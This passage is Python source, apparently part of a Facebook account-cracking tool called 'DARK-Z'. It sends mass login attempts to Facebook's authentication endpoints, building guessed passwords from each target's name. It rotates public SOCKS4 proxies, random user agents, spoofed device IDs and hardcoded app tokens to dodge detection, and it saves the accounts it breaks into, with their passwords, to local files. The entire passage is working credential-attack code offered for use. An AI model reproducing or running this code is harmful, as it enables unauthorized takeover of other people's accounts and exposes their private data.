'98.162.25.29:31679',
'147.139.168.187:3128',
'45.32.94.106:11968',
'188.166.165.63:8888',
'50.233.228.147:8080',
'104.37.135.145:4145',
'41.65.55.10:1981',
'88.201.217.203:80',
'20.44.206.138:80',
'190.90.8.74:8080',
'58.222.166.122:10800',
'192.111.129.145:16894',
'192.252.209.155:14455',
'115.127.105.75:1088',
'121.1.41.162:111',
'192.111.137.37:18762',
'124.158.182.34:10808',
'192.252.208.70:14282',
'195.189.62.7:80',
'201.238.248.134:443',
'106.105.218.244:80',
'34.135.166.24:80',
'185.244.208.195:23699',
'152.69.193.140:3128',
'66.29.129.54:21925',
'184.181.217.213:4145',
'201.91.82.155:3128',
'178.35.177.242:3629',
'154.236.189.14:1974',
'98.162.96.53:10663',
'115.164.146.10:5678',
'188.136.154.52:7060',
'103.234.27.158:1080',
'122.116.150.2:9000',
'171.101.130.5:8080',
'144.49.99.215:8080',
'186.30.116.46:999',
'181.143.59.140:4153',
'61.216.185.88:60808',
'123.30.154.171:7777']
            proxy = random.choice(proxy)
            proxs= {'http': 'socks4://'+proxy}
            dataX = {'email':uid,
                    'password':pw,
                    'cpl':'true',
                    'credentials_type':'password',
                    'error_detail_type':'button_with_disabled',
                    'source':'login',
                    'format':'json',
                    'generate_session_cookies':'1',
                    'generate_analytics_claim':'1',
                    'generate_machine_id':'1'}
            headersX = {'accept-encoding': 'gzip, deflate', 
                    'Accept': '*/*', 
                    'Connection': 'keep-alive', 
                    'content-type': 'application/x-www-form-urlencoded', 
                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
                    'x-fb-friendly-name': 'authenticate', 
                    'x-fb-http-engine': 'Liger',
                    'user-agent': useragent}
            responce = requests.post('https://b-api.facebook.com/method/auth.login',data=dataX,headers=headersX,allow_redirects=False).text
            responce_json = json.loads(responce)
            if 'session_key' in responce_json:
                uidX = str(responce_json['uid'])
                if uidX not in oks:
                    print(f'\r{green}[ALIVE] {uidX} | {pw} {yellow}')
                    open('/sdcard/ALIVE-OK.txt', 'a').write(uidX+'|'+pw+'\n')
                    oks.append(uidX)
            elif responce_json['error_code'] == 405:
                if uid not in cps:
                    print(f'\r{rad}[DEAD] {uid} | {pw} {white}')
                    open('/sdcard/DEAD-CP.txt', 'a').write(uid+'|'+pw+'\n')
                    cps.append(uid)
            else:continue
        cracked.append(uid)
    except requests.exceptions.ConnectionError:time.sleep(10)
    except Exception as e:pass
#_______[ B-API CRACK - FILE ]_____>>
def bapif(uidY,pwx,total):
    global oks,cps
    global ualist
    global cracked
    uid = uidY.split("|")[0]
    name = uidY.split("|")[1]
    fist = name.split(" ")[0]
    try:
        last = name.split(" ")[1]
    except IndexError:
        last = "Khan"
    try:
        sys.stdout.write(f'\r\r[{green}DARK-Z{white}] {len(cracked)}\{total} - {green}{len(oks)}{white}\{rad}{len(cps)}{white} ');sys.stdout.flush()
        for pw in pwx:
            proxy = [
                '103.234.27.158:1080',
                '195.168.91.238:4153',
                '37.57.15.43:47233',
                '197.232.47.102:52567',
                '123.231.230.58:31196',
                '197.245.83.20:5678',
                '105.214.80.151:5678',
                '190.210.231.150:4153',
                '118.137.62.110:1080',
                '176.118.46.24:1080',
                '194.85.135.243:4145',
                '196.207.29.38:33333',
                '163.172.171.22:16379',
                '144.91.95.238:58237',
                '103.83.252.61:1080',
                '41.58.169.214:5678',
                '197.211.24.206:5678',
                '184.178.172.3:4145'
            ]
            proxy = random.choice(proxy)
            pw = pw.replace("first",(fist.lower()))
            pw = pw.replace("last",(last.lower()))
            pw = pw.replace("fullname",(name.lower()))
            pw = pw.replace("First",fist)
            pw = pw.replace("Last",last)
            pw = pw.replace("Fullname",name)
            useragent = str(ua_api())
            proxs = {'http': 'socks4://'+proxy}
            adid = uuid.uuid4()
            device_id = uuid.uuid4()
            family_device_id = uuid.uuid4()
            sim = str(random.randint(11111, 99999))
            xfb_device = str(random.randint(1111, 9999))
            apk = ['438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28', '350685531728|62f8ce9f74b12f84c123cc23437a4a32', '6628568379|c1e620fa708a1d5696fb991c1bde5662', '1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae', '1348564698517390|007c0a9101b9e1c8ffab727666805038']
            app = random.choice(apk)
            dataX = {
                'adid': adid,
                'format': 'json',
                'device_id': device_id,
                'email': uid,
                'password': pw,
                'generate_analytics_claims': '1',
                'community_id': '',
                'cpl': 'true',
                'try_num': '1',
                'family_device_id': family_device_id,
                'credentials_type': 'password',
                'source': 'login',
                'error_detail_type': 'button_with_disabled',
                'enroll_misauth': 'false',
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'currently_logged_in_userid': '0',
                'locale': 'en_US"',
                'client_country_code': 'US',
                'fb_api_req_friendly_name': 'authenticate',
                'api_key': '882a8490361da98702bf97a021ddc14d',
                'access_token': app }
            headersX = {
                'User-Agent': useragent,
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'close',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': sim,
                'X-FB-SIM-HNI': sim,
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'X-FB-Connection-Type': 'Zong',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': '882a8490361da98702bf97a021ddc14d'}
            hed = {'x-fb-connection-bandwidth':str(random.randint(20000000.0, 30000000.0)), 'x-fb-net-hni':str(random.randint(20000, 40000)), 'x-fb-sim-hni':str(random.randint(20000, 40000)), 'x-fb-connection-quality':'EXCELLENT', 'x-fb-connection-type':'cell.CTRadioAccessTechnologyHSDPA', 'user-agent':useragent, 'content-type':'application/x-www-form-urlencoded', 'x-fb-http-engine':'Liger'}
            responce = requests.post('https://graph.facebook.com/auth/login',data=dataX,headers=headersX,allow_redirects=False,proxies=proxs).text
            responce_json = json.loads(responce)
            if 'session_key' in responce_json:
                uid = responce_json['uid']
                if uid not in oks:
                    print(f'\r{green}[DARK-OK] {uid} | {pw} {yellow}')
                    open('/sdcard/DARK-OK.txt', 'a').write(uid+'|'+pw+'\n')
                    oks.append(uid)
            elif responce_json['error']['code'] == 405:
                uid = responce_json['error']['uid']
                if uid not in cps:
                    print(f'\r{rad}[DARK-CP] {uid}     | {pw} {white}')
                    open('/sdcard/DARK-CP.txt', 'a').write(uid+'|'+pw+'\n')
                    cps.append(uid)
            else:continue
        cracked.append(uid)
    except requests.exceptions.ConnectionError:time.sleep(10)
    except Exception as e:print(e)
if __name__=="__main__":
     infinty()
     #bapif("100034118766868|bilal haider id",["4292416"],"2222")
